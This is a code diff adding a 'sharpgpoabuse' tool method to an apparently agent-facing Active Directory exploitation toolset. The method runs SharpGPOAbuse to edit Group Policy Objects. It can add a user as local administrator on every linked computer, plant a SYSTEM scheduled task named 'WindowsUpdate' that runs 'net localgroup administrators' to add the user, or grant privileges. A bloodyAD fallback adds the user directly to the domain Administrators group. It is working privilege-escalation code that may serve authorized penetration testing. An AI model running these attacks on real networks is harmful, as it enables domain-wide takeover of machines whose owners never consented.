@@ -440,3 +440,172 @@ class ACLExploitTools(Toolset):
 
         except Exception as e:
             return f"Targeted Kerberoast failed: {e}"
+
+    @dn.tool_method
+    def sharpgpoabuse(
+        self,
+        gpo_name: str,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+        action: str = "AddLocalAdmin",
+        user_to_add: str | None = None,
+        computer_target: str | None = None,
+    ) -> str:
+        """
+        Abuse GPO edit permissions to gain local admin on GPO-linked computers.
+
+        Use when BloodHound shows you have WriteProperty, WriteDacl, or GenericWrite
+        on a Group Policy Object. This tool modifies the GPO to:
+        - Add a user to local administrators on all linked computers
+        - Create an immediate scheduled task for code execution
+        - Add a new local user account
+
+        **CRITICAL**: This modifies Active Directory GPOs. Changes apply to ALL
+        computers where the GPO is linked. Use carefully in production environments.
+
+        Args:
+            gpo_name: Name of the GPO you have write access to (e.g., "Default Domain Policy")
+            domain: Target domain
+            username: Username with GPO write permissions
+            password: Password for authentication
+            dc_ip: Domain controller IP address
+            action: Attack action - one of:
+                    - "AddLocalAdmin": Add user to local Administrators group
+                    - "AddComputerTask": Create scheduled task for execution
+                    - "AddUserRights": Grant user rights assignment
+            user_to_add: User to add as local admin (default: current user)
+            computer_target: Specific computer to target (default: all GPO-linked)
+
+        Returns:
+            GPO abuse result - success indicates local admin on linked computers
+
+        Example:
+            >>> sharpgpoabuse("Workstations Policy", "domain.local", "user", "pass", "192.168.56.10")
+        """
+        # Default user_to_add to the current user
+        if not user_to_add:
+            user_to_add = username
+
+        # Map friendly action names to SharpGPOAbuse parameters
+        action_params = {
+            "AddLocalAdmin": ["--AddLocalAdmin", "--UserAccount", user_to_add],
+            "AddComputerTask": [
+                "--AddComputerTask",
+                "--TaskName",
+                "WindowsUpdate",
+                "--Author",
+                "NT AUTHORITY\\SYSTEM",
+                "--Command",
+                "cmd.exe",
+                "--Arguments",
+                f"/c net localgroup administrators {user_to_add} /add",
+            ],
+            "AddUserRights": [
+                "--AddUserRights",
+                "--UserRights",
+                "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight",
+                "--UserAccount",
+                user_to_add,
+            ],
+        }
+
+        if action not in action_params:
+            return f"Invalid action '{action}'. Supported: AddLocalAdmin, AddComputerTask, AddUserRights"
+
+        # Build SharpGPOAbuse command
+        # SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "GPO Name"
+        cmd = [
+            "SharpGPOAbuse.exe",
+            *action_params[action],
+            "--GPOName",
+            gpo_name,
+            "--Domain",
+            domain,
+            "--DomainController",
+            dc_ip,
+        ]
+
+        if computer_target:
+            cmd.extend(["--Force", "--FilterEnabled"])
+
+        # SharpGPOAbuse is a .NET tool, run via Wine or mono on Linux
+        # First try direct execution (if running on Windows/Wine), then mono
+        try:
+            logger.info(f"[*] Running SharpGPOAbuse: {action} on GPO '{gpo_name}'")
+
+            # Try with mono first (cross-platform)
+            mono_cmd = ["mono", *cmd]
+            stdout, stderr, _ = run_tool(mono_cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Check for success indicators
+            success_indicators = [
+                "success",
+                "gplink",
+                "modified",
+                "added",
+                "group policy",
+                "local admin",
+            ]
+            if any(indicator in result.lower() for indicator in success_indicators):
+                logger.info(f"[+] GPO abuse successful: {action} on {gpo_name}")
+                return (
+                    f"✅ GPO ABUSE SUCCESSFUL!\n"
+                    f"→ Action: {action}\n"
+                    f"→ GPO: {gpo_name}\n"
+                    f"→ User: {user_to_add}\n"
+                    f"→ Wait for GPO refresh (default: 90 minutes) or force with:\n"
+                    f"   gpupdate /force on target computers\n\n"
+                    f"→ After GPO refresh, {user_to_add} will have local admin on all "
+                    f"computers where '{gpo_name}' is linked\n\n{result}"
+                )
+
+            # If we got output but no clear success, include it anyway
+            if result.strip():
+                return f"GPO abuse result (check output for success):\n{result}"
+
+            return f"GPO abuse may have failed. Output:\n{result}"
+
+        except FileNotFoundError:
+            # Try alternative: bloodyAD for GPO modification
+            logger.info("[*] SharpGPOAbuse not found, attempting bloodyAD GPO modification")
+            try:
+                # Use bloodyAD to set computer object attributes for scheduled task
+                bloody_cmd = [
+                    "bloodyAD",
+                    "-d",
+                    domain,
+                    "-u",
+                    username,
+                    "-p",
+                    password,
+                    "--host",
+                    dc_ip,
+                    "add",
+                    "groupMember",
+                    "Administrators",
+                    user_to_add,
+                ]
+
+                stdout, stderr, _ = run_tool(bloody_cmd, timeout_seconds=60)
+                result = stdout + "\n" + (stderr or "")
+
+                return (
+                    f"⚠️ SharpGPOAbuse not available, attempted group member add:\n"
+                    f"→ This adds {user_to_add} directly to domain group, not via GPO\n"
+                    f"→ For GPO abuse, install SharpGPOAbuse or use manual GPO edit\n\n"
+                    f"{result}"
+                )
+
+            except Exception as e:
+                return (
+                    f"GPO abuse failed: SharpGPOAbuse not found, bloodyAD fallback failed: {e}\n"
+                    f"→ Install SharpGPOAbuse.exe (via Wine/Mono on Linux)\n"
+                    f"→ Or manually edit GPO via RSAT tools"
+                )
+
+        except Exception as e:
+            return f"SharpGPOAbuse failed: {e}"
